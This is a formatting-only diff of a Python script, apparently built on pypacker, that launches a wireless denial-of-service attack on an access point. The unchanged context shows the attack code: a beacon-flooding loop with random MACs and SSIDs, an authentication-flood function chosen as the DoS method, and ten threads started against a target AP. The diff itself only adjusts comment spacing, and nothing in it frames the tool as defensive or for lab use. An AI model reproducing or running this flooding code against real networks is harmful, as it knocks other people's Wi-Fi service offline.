@@ -51,7 +51,7 @@ def send_auth(mac):
 		except socket.timeout:
 			# timeout on sending? that's ok
 			pass
-		#time.sleep(0.1)
+		# time.sleep(0.1)
 
 import string
 import random
@@ -73,7 +73,7 @@ def send_beacon(_):
 			current_channel %= 13
 			if current_channel == 0:
 				current_channel = 1
-			#utils.switch_wlan_channel(wlan_monitor_if, current_channel)
+			# utils.switch_wlan_channel(wlan_monitor_if, current_channel)
 
 		_beacon = beacon[ieee80211.IEEE80211.Beacon]
 		mac = pypacker.get_rnd_mac()
@@ -81,17 +81,17 @@ def send_beacon(_):
 		_beacon.bssid = mac
 		# set new ssid
 		_beacon.params[0].body_bytes = bytes("".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10)), "ascii")
-		#print(_beacon.params[0].body_bytes)
+		# print(_beacon.params[0].body_bytes)
 		_beacon.seq = 0
 
-		#print(_beacon)
+		# print(_beacon)
 
 		try:
 			for x in range(100):
-			# send multiple beacons for every ap
+				# send multiple beacons for every ap
 				psocket.send(beacon.bin())
 				_beacon.seq = x
-				#_beacon.ts = x << (8*7)
+				# _beacon.ts = x << (8*7)
 				_beacon.ts = x
 		except socket.timeout:
 			# timeout on sending? that's ok
@@ -101,7 +101,7 @@ print("starting DOS attack on AP %s" % ap_mac)
 amount_threads = 10
 threads = []
 dos_method = send_auth
-#dos_method=send_beacon
+# dos_method=send_beacon
 
 print("creating threads")
 for x in range(amount_threads):
